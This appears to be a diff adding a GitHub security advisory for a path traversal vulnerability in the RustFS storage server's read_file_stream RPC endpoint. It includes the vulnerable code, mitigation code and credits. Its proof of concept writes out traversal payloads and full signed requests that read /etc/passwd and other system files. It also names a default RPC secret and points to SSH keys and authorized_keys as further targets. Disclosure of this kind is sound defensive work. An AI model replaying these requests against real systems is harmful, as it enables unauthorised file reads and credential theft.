@@ -1,0 +1,47 @@
+{
+  "id": "GHSA-pq29-69jg-9mxc",
+  "modified": "2026-01-07T18:21:12.750176Z",
+  "published": "2026-01-07T18:15:29Z",
+  "summary": "RustFS Path Traversal Vulnerability",
+  "details": "# RustFS Path Traversal Vulnerability\n\n## Vulnerability Details\n\n- **CVE ID**: \n- **Severity**: Critical (CVSS estimated 9.9)\n- **Impact**: Arbitrary File Read/Write\n- **Component**: `/rustfs/rpc/read_file_stream` endpoint\n- **Root Cause**: Insufficient path validation in `crates/ecstore/src/disk/local.rs:1791`\n\n### Vulnerable Code\n\n```rust\n// local.rs:1791 - No path sanitization!\nlet file_path = volume_dir.join(Path::new(\u0026path)); // DANGEROUS!\ncheck_path_length(file_path.to_string_lossy().to_string().as_str())?; // Only checks length\nlet mut f = self.open_file(file_path, O_RDONLY, volume_dir).await?;\n```\n\nThe code uses `PathBuf::join()` without:\n- Canonicalization\n- Path boundary validation\n- Protection against `../` sequences\n- Protection against absolute paths\n\n## Proof of Concept\n\n### Test Environment\n\n- **Target**: RustFS v0.0.5 (Docker container)\n- **Endpoint**: `http://localhost:9000/rustfs/rpc/read_file_stream`\n- **RPC Secret**: `rustfsadmin` (from RUSTFS_SECRET_KEY)\n- **Disk ID**: `/data/rustfs0`\n- **Volume**: `.rustfs.sys`\n\n### Attack Scenario\n\n#### Exploit Parameters\n\n```\ndisk: /data/rustfs0\nvolume: .rustfs.sys\npath: ../../../../etc/passwd  # Path traversal payload\noffset: 0\nlength: 751  # Must match file size\n```\n\n#### Required Authentication\n\nRPC requests require HMAC-SHA256 signature:\n\n```python\n# Signature format: HMAC-SHA256(secret, \"{url}|{method}|{timestamp}\")\nHeaders:\n  x-rustfs-signature: Base64(HMAC-SHA256(secret, data))\n  x-rustfs-timestamp: Unix timestamp\n```\n\n### Successful Exploits\n\n#### 1. Read `/etc/passwd` ✅\n\n**Request:**\n```\nGET /rustfs/rpc/read_file_stream?disk=/data/rustfs0\u0026volume=.rustfs.sys\u0026path=../../../../etc/passwd\u0026offset=0\u0026length=751\nx-rustfs-signature: QAesB6sNdwKJluifpIhbKyhdK2EEiiyhpvfRJmXZKlg=\nx-rustfs-timestamp: 1766482485\n```\n\n**Response:** HTTP 200 OK\n\n**Content Retrieved:**\n```\nroot:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\n[... 15 more lines ...]\nrustfs:x:10001:10001::/home/rustfs:/sbin/nologin\n```\n\n**Impact**: Full user account enumeration\n\n---\n\n#### 2. Read `/etc/hosts` ✅\n\n**Request:**\n```\nGET /rustfs/rpc/read_file_stream?disk=/data/rustfs0\u0026volume=.rustfs.sys\u0026path=../../../../etc/hosts\u0026offset=0\u0026length=172\n```\n\n**Response:** HTTP 200 OK\n\n**Content Retrieved:**\n```\n127.0.0.1\tlocalhost\n::1\tlocalhost ip6-localhost ip6-loopback\n[...]\n172.20.0.3\td25e05a19bd2\n```\n\n**Impact**: Network configuration disclosure\n\n---\n\n#### 3. Read `/etc/hostname` ✅\n\n**Request:**\n```\nGET /rustfs/rpc/read_file_stream?disk=/data/rustfs0\u0026volume=.rustfs.sys\u0026path=/etc/hostname\u0026offset=0\u0026length=13\n```\n\n**Response:** HTTP 200 OK\n\n**Content Retrieved:**\n```\nd25e05a19bd2\n```\n\n**Impact**: System information disclosure\n\n---\n\n## Technical Analysis\n\n### Data Flow\n\n```\n1. HTTP Request\n   ↓\n2. RPC Signature Verification (verify_rpc_signature)\n   ↓\n3. Find Disk (find_local_disk)\n   ↓\n4. Read File Stream (disk.read_file_stream)\n   ↓\n5. VULNERABLE: volume_dir.join(Path::new(\u0026path))\n   ↓\n6. File Read: /data/rustfs0/.rustfs.sys/../../../../etc/passwd\n              → /etc/passwd\n```\n\n### Path Traversal Mechanism\n\n```rust\n// Example traversal:\nvolume_dir = PathBuf::from(\"/data/rustfs0/.rustfs.sys\")\npath = \"../../../../etc/passwd\"\n\n// PathBuf::join() resolves to:\nfile_path = \"/data/rustfs0/.rustfs.sys/../../../../etc/passwd\"\n          = \"/etc/passwd\"  // Successfully escaped!\n```\n\n### Why It Works\n\n1. **No Canonicalization**: Code doesn't use `canonicalize()` before validation\n2. **No Boundary Check**: No verification that final path is within volume_dir\n3. **PathBuf::join() Behavior**: Automatically resolves `../` sequences\n4. **Length-Only Validation**: `check_path_length()` only checks string length\n\n### Special Considerations\n\n- **File Size Constraint**: The `length` parameter must exactly match file size\n  - Code validates: `file.len() \u003e= offset + length`\n  - Otherwise returns `DiskError::FileCorrupt`\n- **Volume Requirement**: Volume/bucket must exist (e.g., `.rustfs.sys`)\n- **Disk Requirement**: Disk must be registered in `GLOBAL_LOCAL_DISK_MAP`\n\n## Impact Assessment\n\n### Confidentiality Impact: HIGH\n\n- ✅ Read arbitrary files (demonstrated)\n- ✅ Read system configuration files (`/etc/passwd`, `/etc/hosts`)\n- ⚠️ Potential to read:\n  - SSH keys (`/root/.ssh/id_rsa`)\n  - Application secrets\n  - RustFS configuration files\n  - Environment variables from `/proc`\n\n### Integrity Impact: HIGH\n\n- ⚠️ Similar vulnerability exists in `put_file_stream` (not tested)\n- ⚠️ Arbitrary file write likely possible\n- ⚠️ Could write to:\n  - Cron jobs\n  - authorized_keys\n  - System binaries (if permissions allow)\n\n### Availability Impact: MEDIUM\n\n- ⚠️ `walk_dir` endpoint could enumerate entire filesystem\n- ⚠️ Potential DoS via recursive directory traversal\n\n## Exploitation Requirements\n\n### Prerequisites\n\n1. **Network Access**: Ability to reach RustFS RPC endpoints\n2. **RPC Secret Knowledge**: Knowledge of RUSTFS_SECRET_KEY\n   - Default: `\"rustfs-default-secret\"`\n   - Production: From environment variable or config\n3. **Disk/Volume Knowledge**: Valid disk ID and volume name\n4. **File Size Knowledge**: Exact file sizes for successful reads\n\n### Attack Complexity\n\n- **Without Secret**: Impossible (signature verification)\n- **With Secret**: Trivial (automated script)\n- **With Default Secret**: Critical risk if not changed\n\n## Mitigation Recommendations\n\n### Immediate Actions (Priority 0)\n\n1. **Path Canonicalization**\n```rust\nasync fn read_file_stream(\u0026self, volume: \u0026str, path: \u0026str, ...) -\u003e Result\u003cFileReader\u003e {\n    let volume_dir = self.get_bucket_path(volume)?;\n\n    // CRITICAL FIX:\n    let file_path = volume_dir.join(Path::new(\u0026path));\n    let canonical = file_path.canonicalize()\n        .map_err(|_| DiskError::FileNotFound)?;\n\n    // Validate path is within volume_dir\n    if !canonical.starts_with(\u0026volume_dir) {\n        error!(\"Path traversal attempt detected: {:?}\", path);\n        return Err(DiskError::InvalidArgument);\n    }\n\n    // Continue with validated path...\n}\n```\n\n2. **Path Component Validation**\n```rust\n// Reject dangerous path components\nif path.contains(\"..\") || path.starts_with('/') {\n    return Err(DiskError::InvalidArgument);\n}\n```\n\n3. **Use path-clean Crate**\n```rust\nuse path_clean::PathClean;\n\nlet cleaned_path = PathBuf::from(\u0026path).clean();\nif cleaned_path.to_string_lossy().contains(\"..\") {\n    return Err(DiskError::InvalidArgument);\n}\n```\n\n### Additional Security Measures\n\n4. **Audit Logging**: Log all RPC file operations with full paths\n5. **Rate Limiting**: Prevent DoS via repeated RPC calls\n6. **Secret Rotation**: Ensure unique RPC secrets per deployment\n7. **Network Segmentation**: Restrict RPC endpoint access\n8. **Security Testing**: Add path traversal tests to test suite\n\n### Long-term Improvements\n\n9. **Chroot Jail**: Isolate RPC operations in chroot environment\n10. **Least Privilege**: Run RustFS with minimal file system permissions\n11. **Security Audit**: Comprehensive review of all file operations\n\n## Proof of Concept Script\n\nThe complete PoC is available at: `exploit_path_traversal.py`\n\n### Usage\n\n```bash\n# Ensure RustFS is running\ndocker compose ps\n\n# Run exploit\npython3 exploit_path_traversal.py\n```\n\n### Output\n\n```\n[+] SUCCESS! Read 751 bytes\n[+] File content:\n================================================================================\nroot:x:0:0:root:/root:/bin/sh\n[... full /etc/passwd content ...]\n================================================================================\n```\n\n## Acknowledgements\n\nRustFS would like to thank **bilisheep** from the **Xmirror Security Team** for discovering and responsibly reporting this vulnerability.\n\nAcknowledgements: RustFS would like to thank @realansgar and  **bilisheep** from the **Xmirror Security Team** for providing the security report.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "rustfs",
+        "purl": "pkg:cargo/rustfs"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.0.0-alpha.13"
+            },
+            {
+              "fixed": "1.0.0-alpha.79"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.0.0-alpha.78",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-pq29-69jg-9mxc/GHSA-pq29-69jg-9mxc.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/rustfs/rustfs/security/advisories/GHSA-pq29-69jg-9mxc"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/rustfs/rustfs/commit/ab752458ce431c6397175d167beee2ea00507d3e"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/rustfs/rustfs"
+    }
+  ]
+}
